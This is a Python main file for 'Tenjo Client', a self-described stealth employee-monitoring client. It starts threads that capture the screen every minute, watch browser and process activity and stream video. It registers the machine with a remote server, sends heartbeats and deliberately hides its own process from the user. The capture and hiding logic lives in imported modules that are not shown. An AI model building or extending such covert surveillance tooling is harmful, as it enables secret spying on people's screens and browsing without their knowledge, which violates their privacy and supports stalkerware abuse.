# Tenjo Client - Employee Monitoring Application
# Cross-platform stealth monitoring client

import sys
import os
import threading
import time
import json
import requests
from datetime import datetime
import logging

# Import modules
from src.core.config import Config
from src.modules.screen_capture import ScreenCapture
from src.modules.browser_monitor import BrowserMonitor
from src.modules.process_monitor import ProcessMonitor
from src.modules.stream_handler import StreamHandler
from src.utils.stealth import StealthManager
from src.utils.api_client import APIClient

class TenjoClient:
    def __init__(self):
        # Use API_ENDPOINT from config
        self.api_client = APIClient(Config.SERVER_URL, "dummy-api-key")
        self.stealth_manager = StealthManager()
        
        # Initialize modules
        self.screen_capture = ScreenCapture(self.api_client)
        self.browser_monitor = BrowserMonitor(self.api_client)
        self.process_monitor = ProcessMonitor(self.api_client)
        self.stream_handler = StreamHandler(self.api_client)
        
        # Setup logging (hidden)
        self.setup_logging()
        
    def setup_logging(self):
        """Setup stealth logging"""
        log_dir = Config.LOG_DIR
        
        logging.basicConfig(
            filename=Config.LOG_FILE,
            level=getattr(logging, Config.LOG_LEVEL),
            format='%(asctime)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        
    def start_monitoring(self):
        """Start all monitoring services"""
        try:
            # Register client with server
            self.register_client()
            
            # Start monitoring threads
            threads = []
            
            # Screenshot thread (every 1 minute)
            screenshot_thread = threading.Thread(
                target=self.screen_capture.start_capture,
                daemon=True
            )
            threads.append(screenshot_thread)
            
            # Browser monitoring thread
            browser_thread = threading.Thread(
                target=self.browser_monitor.start_monitoring,
                daemon=True
            )
            threads.append(browser_thread)
            
            # Process monitoring thread
            process_thread = threading.Thread(
                target=self.process_monitor.start_monitoring,
                daemon=True
            )
            threads.append(process_thread)
            
            # Stream handler thread
            stream_thread = threading.Thread(
                target=self.stream_handler.start_streaming,
                daemon=True
            )
            threads.append(stream_thread)
            
            # Start all threads
            for thread in threads:
                thread.start()
            
            logging.info("Tenjo client started successfully")
            
            # Keep main thread alive
            while True:
                time.sleep(60)
                self.send_heartbeat()
                
        except Exception as e:
            logging.error(f"Error starting monitoring: {str(e)}")
            
    def register_client(self):
        """Register this client with the server"""
        client_info = {
            'hostname': Config.CLIENT_NAME,
            'os': {'name': 'macOS', 'version': '14.0'},
            'ip_address': '127.0.0.1',
            'user': Config.CLIENT_USER,
            'timezone': 'Asia/Jakarta'
        }
        
        response = self.api_client.post('/api/clients/register', client_info)
        if response:
            logging.info(f"Client registered successfully")
        
    def send_heartbeat(self):
        """Send heartbeat to server"""
        heartbeat_data = {
            'client_id': Config.CLIENT_ID,
            'timestamp': datetime.now().isoformat(),
            'status': 'active'
        }
        self.api_client.post('/api/clients/heartbeat', heartbeat_data)

def main():
    """Main entry point"""
    try:
        client = TenjoClient()
        
        # Hide process
        client.stealth_manager.hide_process()
        
        # Start monitoring
        client.start_monitoring()
        
    except KeyboardInterrupt:
        logging.info("Client stopped by user")
    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")

if __name__ == "__main__":
    main()
